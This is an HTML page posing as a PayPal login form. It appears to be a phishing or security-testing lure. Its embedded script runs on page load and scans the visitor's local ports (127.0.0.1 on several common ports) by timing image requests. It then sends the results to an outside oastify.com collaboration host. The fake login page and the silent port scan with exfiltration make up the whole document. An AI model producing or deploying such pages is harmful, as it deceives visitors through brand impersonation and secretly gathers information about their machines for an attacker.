<!DOCTYPE html>
<html>
<head><title>Login - PayPal</title></head>
<body>
<h1>PayPal Login</h1>
<form>
  <input type="email" placeholder="Email">
  <input type="password" placeholder="Password">
  <button>Login</button>
</form>
<script>
const collab = "9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com";
const ports = [80, 443, 8000, 8080, 3000, 5000, 8888];
const results = {};
let done = 0;

function probe(port) {
  const start = Date.now();
  const img = new Image();
  img.onload = img.onerror = function() {
    results[port] = Date.now() - start;
    done++;
    if (done === ports.length) sendResults();
  };
  img.src = `http://127.0.0.1:${port}/favicon.ico?_=${Math.random()}`;
  setTimeout(() => {
    if (!results[port]) {
      results[port] = 'timeout';
      done++;
      if (done === ports.length) sendResults();
    }
  }, 1500);
}

function sendResults() {
  const data = Object.entries(results)
    .map(([p,t]) => `${p}:${t}`)
    .join(',');
  new Image().src = `http://${collab}/?ports=${encodeURIComponent(data)}`;
}

ports.forEach(probe);
</script>
</body>
</html>
